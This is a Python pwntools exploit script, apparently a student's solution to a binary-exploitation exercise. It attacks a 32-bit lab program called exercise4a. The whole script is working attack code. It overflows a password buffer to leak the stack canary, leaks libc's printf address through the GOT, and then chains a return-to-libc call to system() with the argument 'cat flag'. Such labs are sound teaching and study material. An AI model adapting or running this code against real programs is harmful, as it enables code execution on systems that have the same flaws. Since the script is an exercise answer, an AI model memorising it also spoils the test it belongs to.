#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = '/home/student/handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x8049353
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
elf = ELF("/home/student/handout/exercise4/exercise4a")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf_printf = elf.symbols['printf']
elf_check_authorization = elf.symbols['check_authorization']
elf_name = elf.symbols['name']
libc_printf = libc.symbols['printf']
libc_system = libc.symbols['system']
libc_exit = libc.symbols['exit']
got_printf = elf.got['printf']

r.recvuntil(b'name?')
r.sendline(b'cat flag')

r.recvuntil(b'password:\n')
r.sendline(b'A' * 343)
r.readline()
stuff_str = r.readline()

canary = stuff_str[:4]

r.recvuntil(b'password:\n')
r.send(b'A' * 344)
r.send(canary)
r.send(b'B' * 16)
r.send(p32(elf_printf)) # what we want to call
r.send(p32(elf_check_authorization)) # where to jump back to
r.sendline(p32(got_printf)) # printf argument

r.recvuntil(b'password\n')
stuff_str = r.readline()
runtime_printf = stuff_str[:4]
runtime_offset  = u32(runtime_printf) - libc_printf

system = runtime_offset + libc_system
exit = runtime_offset + libc_exit

r.send(b'A' * 344)
r.send(canary)
r.send(b'B' * 16)
r.send(p32(system)) # what we want to call
r.send(p32(exit)) # where to jump back to
r.sendline(p32(elf_name)) # system argument

r.recvline()
r.recvline()
print(r.recvline())
